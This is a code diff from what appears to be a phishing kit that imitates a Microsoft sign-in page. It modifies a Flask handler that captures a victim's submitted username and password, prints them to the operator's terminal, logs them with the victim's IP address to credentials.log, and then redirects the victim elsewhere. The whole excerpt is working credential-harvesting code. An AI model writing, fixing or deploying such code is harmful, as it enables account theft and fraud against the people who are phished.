@@ -51,9 +51,10 @@ def passwd():
 def getcreds():
     with open("credentials.log" , "a") as file:
         print("\033[3A" + Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.YELLOW + " Victim entered credentials!"+ " " * 43)
-        print("\033[1B" + Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Password: " + Fore.CYAN + f"{request.form.to_dict(flat=False)[list(request.form.to_dict(flat=False).keys())[0]][0]}" + " "*31)
+        print("\033[1B" + Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Password: " + Fore.CYAN + f"{request.form.get('passwd')}" + " "*31)
         print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Saved in: " + Fore.CYAN + "credentials.log")
-        file.write(f"{list(request.form.to_dict(flat=False).keys())[0]} : {request.form.to_dict(flat=False)[list(request.form.to_dict(flat=False).keys())[0]][0]} : {request.headers.get('X-Forwarded-For') if request.headers.get('X-Forwarded-For') is not None else request.remote_addr} : {sitename}\n")
+        file.write(f"{request.form.to_dict(flat=False)['loginfmt'][0]} : {request.form.get('passwd')} : {request.headers.get('X-Forwarded-For') if request.headers.get('X-Forwarded-For') is not None else request.remote_addr} : {sitename}\n")
+        return redirect(redirect_url)
 
 
 @app.route("/sprites/microsoft_logo.svg")
